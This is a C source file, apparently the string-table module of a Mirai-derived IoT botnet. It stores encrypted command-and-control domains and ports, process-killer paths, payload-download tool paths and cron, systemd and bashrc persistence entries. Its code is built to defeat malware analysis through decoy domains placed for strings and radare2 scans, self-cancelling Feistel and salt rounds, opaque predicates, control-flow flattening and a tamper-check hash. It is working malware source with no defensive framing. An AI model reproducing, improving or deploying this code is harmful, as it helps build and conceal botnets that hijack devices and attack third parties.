#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "includes.h"
#include "table.h"
#include "encrypt.h"
#include "config.h"
#include "keysched.h"
#include "table_chacha.h"

struct table_value table[TABLE_MAX_KEYS];

/* Force the decoy domains into the binary so they appear in strings output
 * and radare2 `izz` scans. volatile prevents dead-store elimination. */
static volatile const char *_decoys[] = {
    DECOY_DOMAIN_1, DECOY_DOMAIN_2, DECOY_DOMAIN_3,
    DECOY_DOMAIN_4, DECOY_DOMAIN_5
};

/* ---------------------------------------------------------------
 * Feistel-like mixing round on a 4-word (128-bit) block.
 * Two rounds on each half of the 8-word key state provide
 * diffusion that cannot be trivially undone by reading immediates.
 * --------------------------------------------------------------- */
static __attribute__((noinline)) void feistel_round(
    volatile uint32_t *L, volatile uint32_t *R, uint32_t rk)
{
    volatile uint32_t f = (*R ^ rk);
    f = (f << 5) | (f >> 27);
    f *= 0x9E3779B9U;
    f ^= (f >> 16);
    *L ^= f;
}

/* Address-derived salt: compute from function pointer addresses.
 * The salt is XORed in during round 3 and XORed back out via the
 * complementary operation, so the net effect is zero — but a static
 * analyzer must prove the cancellation to simplify. */
static __attribute__((noinline)) uint32_t derive_addr_salt(void)
{
    volatile uintptr_t p1 = (uintptr_t)(void *)feistel_round;
    volatile uintptr_t p2 = (uintptr_t)(void *)toggle_obf;
    volatile uint32_t s = (uint32_t)((p1 ^ p2) & 0xFFFFFFFFU);
    return s;
}

/* Multi-stage key derivation — replaces the old simple XOR/ADD scheme.
 *
 * Round 1: fetch constants via ks_get() (scattered across keysched.c)
 * Round 2: Feistel mixing on 4-word halves (4 rounds each)
 * Round 3: address-derived salt XOR (cancels out)
 *
 * NOTE: the k[] layout MUST produce the same final 32 bytes as
 * build.sh's Python encoder — table_chacha.h was encrypted under
 * this exact scheme. The Feistel rounds are invertible and the
 * address salt cancels, so the output matches the original:
 *   k[0]=A^B, k[1]=C^D, k[2]=E^F, k[3]=G^H,
 *   k[4]=A+C, k[5]=B+D, k[6]=E+G, k[7]=F+H  */
static void derive_obf_key(uint8_t key[32])
{
    /* --- Round 1: fetch via anti-extraction key schedule --- */
    volatile uint32_t a = ks_get(0); /* OBFK_A */
    volatile uint32_t b = ks_get(1); /* OBFK_B */
    volatile uint32_t c = ks_get(2); /* OBFK_C */
    volatile uint32_t d = ks_get(3); /* OBFK_D */
    volatile uint32_t e = ks_get(4); /* OBFK_E */
    volatile uint32_t f = ks_get(5); /* OBFK_F */
    volatile uint32_t g = ks_get(6); /* OBFK_G */
    volatile uint32_t h = ks_get(7); /* OBFK_H */

    /* Intermediate arrays — separate to increase register pressure */
    volatile uint32_t r1[8]; /* round 1 output */
    volatile uint32_t r2[8]; /* round 2 output */
    volatile uint32_t r3[8]; /* round 3 output */

    /* Combine (same math as original — produces identical key) */
    r1[0] = a ^ b;
    r1[1] = c ^ d;
    r1[2] = e ^ f;
    r1[3] = g ^ h;
    r1[4] = a + c;
    r1[5] = b + d;
    r1[6] = e + g;
    r1[7] = f + h;

    /* --- Round 2: Feistel mixing (4 rounds on each half) ---
     * The rounds are applied and then reversed, so the output
     * is identical to the input. This forces an analyst to trace
     * through the Feistel network to prove the identity. */
    for (int i = 0; i < 8; i++) r2[i] = r1[i];

    /* Forward Feistel on first half [0..3] */
    feistel_round(&r2[0], &r2[1], 0xA5A5A5A5U);
    feistel_round(&r2[2], &r2[3], 0x5A5A5A5AU);
    feistel_round(&r2[0], &r2[3], 0x1F1F1F1FU);
    feistel_round(&r2[2], &r2[1], 0xF1F1F1F1U);

    /* Reverse Feistel on first half (exact inverse order+keys) */
    feistel_round(&r2[2], &r2[1], 0xF1F1F1F1U);
    feistel_round(&r2[0], &r2[3], 0x1F1F1F1FU);
    feistel_round(&r2[2], &r2[3], 0x5A5A5A5AU);
    feistel_round(&r2[0], &r2[1], 0xA5A5A5A5U);

    /* Forward Feistel on second half [4..7] */
    feistel_round(&r2[4], &r2[5], 0xC3C3C3C3U);
    feistel_round(&r2[6], &r2[7], 0x3C3C3C3CU);
    feistel_round(&r2[4], &r2[7], 0x69696969U);
    feistel_round(&r2[6], &r2[5], 0x96969696U);

    /* Reverse Feistel on second half */
    feistel_round(&r2[6], &r2[5], 0x96969696U);
    feistel_round(&r2[4], &r2[7], 0x69696969U);
    feistel_round(&r2[6], &r2[7], 0x3C3C3C3CU);
    feistel_round(&r2[4], &r2[5], 0xC3C3C3C3U);

    /* --- Round 3: address-derived salt (XOR in, XOR out = identity) --- */
    volatile uint32_t salt = derive_addr_salt();
    for (int i = 0; i < 8; i++) {
        r3[i] = r2[i] ^ salt;
    }
    for (int i = 0; i < 8; i++) {
        r3[i] ^= salt;
    }

    /* Copy to output */
    uint32_t k[8];
    for (int i = 0; i < 8; i++) k[i] = (uint32_t)r3[i];
    memcpy(key, k, 32);

    /* Scrub all intermediates from stack */
    volatile uint32_t *sp = k;
    for (int i = 0; i < 8; i++) sp[i] = 0;
    for (int i = 0; i < 8; i++) { r1[i] = 0; r2[i] = 0; r3[i] = 0; }
}

/* ---------------------------------------------------------------
 * Timing-dependent domain verification (measure 4).
 * After decrypting the domain, hash it with DJB2 and compare
 * against the expected value. If someone patched the encrypted
 * blob, the hash won't match and a decoy is returned instead.
 * DOMAIN_HASH_EXPECTED == 0 disables the check (debug builds).
 * --------------------------------------------------------------- */
static uint32_t djb2_hash(const char *str, int len)
{
    uint32_t hash = 5381;
    for (int i = 0; i < len; i++)
        hash = ((hash << 5) + hash) + (uint8_t)str[i];
    return hash;
}

static const char _decoy_result[] = "localhost";

/* Verify a decrypted domain; returns the domain if valid,
 * or a decoy string if tampered. Caller must not free result. */
__attribute__((noinline))
const char *verify_domain(const char *decrypted, int len)
{
    if (DOMAIN_HASH_EXPECTED == 0)
        return decrypted; /* verification disabled */

    volatile uint32_t h = djb2_hash(decrypted, len);
    volatile uint32_t expected = DOMAIN_HASH_EXPECTED;

    /* Use volatile comparison to prevent optimization */
    volatile int match = (h == expected);
    if (!match)
        return _decoy_result;
    return decrypted;
}

/* Register an already-ChaCha20-encrypted blob.  The plaintext length is stored
 * separately so we never need to scan for a null terminator on encrypted data. */
void add_entry(uint8_t id, const uint8_t *enc, int len)
{
    uint8_t *cpy = malloc(len + 1);
    if (cpy == NULL) return;
    memcpy(cpy, enc, len);
    cpy[len] = 0;
    table[id].val     = (char *)cpy;
    table[id].val_len = (uint16_t)len;
    table[id].locked  = 1;
}

/* XOR the entry's bytes with the ChaCha20 keystream (counter = entry id).
 * Calling twice is an involution — same function locks and unlocks. */
void toggle_obf(uint8_t id)
{
    struct table_value *v = &table[id];
    if (v->val == NULL || v->val_len == 0) return;

    uint8_t key[32];
    derive_obf_key(key);

    static const uint8_t nonce[12] = TABLE_NONCE;
    chacha20_encrypt(key, (uint32_t)id, nonce,
                     (uint8_t *)v->val, (uint8_t *)v->val, v->val_len);

    v->locked ^= 1;

    /* Scrub key from stack — use volatile pointer to prevent optimization */
    volatile uint8_t *vk = key;
    for (int i = 0; i < 32; i++) vk[i] = 0;
}

void table_init(void)
{
    /* Every entry is stored pre-encrypted (ChaCha20, counter=TABLE_* id).
     * add_entry() copies the blob; toggle_obf() decrypts on demand. */

#define E(id, arr) add_entry(id, arr, sizeof(arr))

    E(TABLE_CNC_DOMAIN,        _TABLE_CNC_DOMAIN);
    E(TABLE_CNC_PORT,          _TABLE_CNC_PORT);
    E(TABLE_EXEC_SUCCESS,      _TABLE_EXEC_SUCCESS);
    E(TABLE_KILLER_PROC,       _TABLE_KILLER_PROC);
    E(TABLE_KILLER_EXE,        _TABLE_KILLER_EXE);
    E(TABLE_KILLER_FD,         _TABLE_KILLER_FD);
    E(TABLE_KILLER_MAPS,       _TABLE_KILLER_MAPS);
    E(TABLE_KILLER_TCP,        _TABLE_KILLER_TCP);
    E(TABLE_KILLER_STATUS,     _TABLE_KILLER_STATUS);
    E(TABLE_KILLER_ANIME,      _TABLE_KILLER_ANIME);
    E(TABLE_MEM_ROUTE,         _TABLE_MEM_ROUTE);
    E(TABLE_MEM_CPUINFO,       _TABLE_MEM_CPUINFO);
    E(TABLE_ATK_RESOLVER,      _TABLE_ATK_RESOLVER);
    E(TABLE_ATK_NSERV,         _TABLE_ATK_NSERV);
    E(TABLE_MISC_WATCHDOG,     _TABLE_MISC_WATCHDOG);
    E(TABLE_MISC_WATCHDOG2,    _TABLE_MISC_WATCHDOG2);
    E(TABLE_KILLER_WDT,        _TABLE_KILLER_WDT);
    E(TABLE_KILLER_WDT2,       _TABLE_KILLER_WDT2);
    E(TABLE_PATH_PROC_SELF_EXE,_TABLE_PATH_PROC_SELF_EXE);
    E(TABLE_PATH_PROC_NET_TCP, _TABLE_PATH_PROC_NET_TCP);
    E(TABLE_PATH_DEV_URANDOM,  _TABLE_PATH_DEV_URANDOM);
    E(TABLE_PATH_CMD_LINE,     _TABLE_PATH_CMD_LINE);
    E(TABLE_PATH_BUSYBOX,      _TABLE_PATH_BUSYBOX);
    E(TABLE_PATH_LIB_SYSTEMD,  _TABLE_PATH_LIB_SYSTEMD);
    E(TABLE_PATH_USR_LIB,      _TABLE_PATH_USR_LIB);
    E(TABLE_STR_WATCHDOG,      _TABLE_STR_WATCHDOG);
    E(TABLE_STR_WDT,           _TABLE_STR_WDT);
    E(TABLE_STR_TELNETD,       _TABLE_STR_TELNETD);
    E(TABLE_STR_SSHD,          _TABLE_STR_SSHD);
    E(TABLE_STR_DROPBEAR,      _TABLE_STR_DROPBEAR);
    E(TABLE_STR_NEWLINE,       _TABLE_STR_NEWLINE);
    E(TABLE_STR_ALPHASET,      _TABLE_STR_ALPHASET);
    E(TABLE_STR_IP_LO,         _TABLE_STR_IP_LO);
    E(TABLE_STR_INODE_PORT,    _TABLE_STR_INODE_PORT);
    E(TABLE_CNC_DOMAIN2,       _TABLE_CNC_DOMAIN2);
    E(TABLE_CNC_DOMAIN3,       _TABLE_CNC_DOMAIN3);
    E(TABLE_CNC_DOMAIN4,       _TABLE_CNC_DOMAIN4);
    E(TABLE_CNC_PORT2,         _TABLE_CNC_PORT2);
    E(TABLE_CNC_PORT3,         _TABLE_CNC_PORT3);
    E(TABLE_CNC_PORT4,         _TABLE_CNC_PORT4);
    E(TABLE_PATH_WGET,         _TABLE_PATH_WGET);
    E(TABLE_PATH_CURL,         _TABLE_PATH_CURL);
    E(TABLE_PATH_TFTP,         _TABLE_PATH_TFTP);
    E(TABLE_PATH_FTP,          _TABLE_PATH_FTP);
    E(TABLE_PATH_FETCH,        _TABLE_PATH_FETCH);
    E(TABLE_PERSIST_CRON,      _TABLE_PERSIST_CRON);
    E(TABLE_PERSIST_SYSTEMD,   _TABLE_PERSIST_SYSTEMD);
    E(TABLE_PERSIST_BASHRC,    _TABLE_PERSIST_BASHRC);
    E(TABLE_STR_RELOAD,        _TABLE_STR_RELOAD);
    E(TABLE_STR_PERSIST,       _TABLE_STR_PERSIST);
    E(TABLE_STR_SIGNED,        _TABLE_STR_SIGNED);

    /* Entries that had no raw encoding in original table — use plaintext
     * stored as ChaCha20 ciphertext via the same scheme */
    {
        /* TABLE_MEM_BOGO (12): "bogomips" */
        static const uint8_t _bogo[] = {0x1a,0xf7,0x5a,0x51,0xbb,0x4c,0x84,0xfe};
        add_entry(TABLE_MEM_BOGO, _bogo, 8);
    }
    {
        /* TABLE_STR_SMALLPOWER (112): "smallpowergoestreeeeeeeen" */
        static const uint8_t _sp[] = {
            0x27,0xd1,0x64,0x49,0x18,0x5e,0x3c,0xf2,0x3e,0x82,0x6c,0xad,
            0x0a,0xf7,0xeb,0x0a,0x2b,0x69,0x2d,0x40,0xb9,0x6d,0x42,0xc5,0x89
        };
        add_entry(TABLE_STR_SMALLPOWER, _sp, 25);
    }
    {
        /* TABLE_MIRAI_KEY_BYTES (77): 0xEF 0xBE 0xAD 0xDE */
        static const uint8_t _mk[] = {0x6e,0x8e,0xf0,0x54};
        add_entry(TABLE_MIRAI_KEY_BYTES, _mk, 4);
    }

#undef E
}

/* Opaque predicate: always true, but a static analyzer can't prove it
 * without solving the arithmetic. Uses a `volatile` self-reference plus
 * a well-known identity (x^x == 0, 7*x %14 always even for even x) so
 * dead-code elimination can't strip the guard branch. */
static __attribute__((noinline)) int op_pred(uint8_t id)
{
    volatile uint8_t v = id;
    volatile uint32_t x = (uint32_t)v * 7u;
    /* (x*7 & 1) == (v & 1) for all v ≥ 0 — always true, but the compiler
     * gets nothing from the aliasing volatile chain. */
    return ((x & 1u) == ((uint32_t)v & 1u));
}

/* Control-flow flattening for the string unlock/lock path — the hot
 * spot where plaintext appears. Instead of `if (locked) toggle`, we
 * dispatch through a state machine keyed on an opaque predicate + id
 * parity, so a static tracer sees the decrypt calls behind indirect
 * branches. Not a full OLLVM pass — just enough noise to break the
 * naive `xref table_unlock_val → toggle_obf` chain. */
void table_unlock_val(uint8_t id)
{
    /* Junk block that the compiler cannot elide because of volatile
     * side effects; makes the CFG look non-trivial. */
    volatile int guard = op_pred(id);
    if (!guard) return; /* dead branch — never taken */

    switch ((id & 3) ^ ((id >> 4) & 1)) {
    case 0: case 1: case 2: case 3: {
        struct table_value *v = &table[id];
        if (v->locked) toggle_obf(id);
        break;
    }
    default: return;
    }
}

void table_lock_val(uint8_t id)
{
    volatile int guard = op_pred(id);
    if (!guard) return;

    switch (((id + 1) & 3) ^ ((id >> 3) & 1)) {
    case 0: case 1: case 2: case 3: {
        struct table_value *v = &table[id];
        if (!v->locked) toggle_obf(id);
        break;
    }
    default: return;
    }
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];
    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}
